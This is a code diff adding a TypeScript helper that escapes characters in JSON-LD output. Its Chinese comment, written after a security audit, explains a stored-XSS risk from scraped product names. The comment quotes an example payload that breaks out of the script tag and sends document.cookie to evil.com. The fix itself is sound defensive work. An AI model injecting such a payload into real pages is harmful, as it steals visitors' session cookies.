@@ -368,3 +368,23 @@ export function parseSearchParams(searchParams: URLSearchParams) {
   
   return { category, search, sort, minPrice, maxPrice, inStock }
 }
+
+/**
+ * 安全版 JSON-LD 序列化（2026-10-30 全站安全审计）
+ *
+ * 问题：`JSON.stringify()` **不会**转义 `<`，所以一个商品名叫
+ *   `</script><script>fetch('//evil.com?c='+document.cookie)`
+ * 时，注入到 `<script type="application/ld+json">{...}</script>` 里，
+ * **HTML 解析器会提前闭合 script 标签**，后面的内容当成正常 HTML 执行 → 存储型 XSS。
+ *
+ * 商品名/描述来自 1688 采集（外部内容），不是我们自己能完全控制的字段，
+ * 所以在注入前把 `<` `>` `&` 转成 Unicode 转义即可（JSON 语义不变，HTML 安全）。
+ */
+export function safeJsonLd(data: unknown): string {
+  return JSON.stringify(data)
+    .replace(/</g, '\\u003c')
+    .replace(/>/g, '\\u003e')
+    .replace(/&/g, '\\u0026')
+    .replace(/\u2028/g, '\\u2028')
+    .replace(/\u2029/g, '\\u2029')
+}
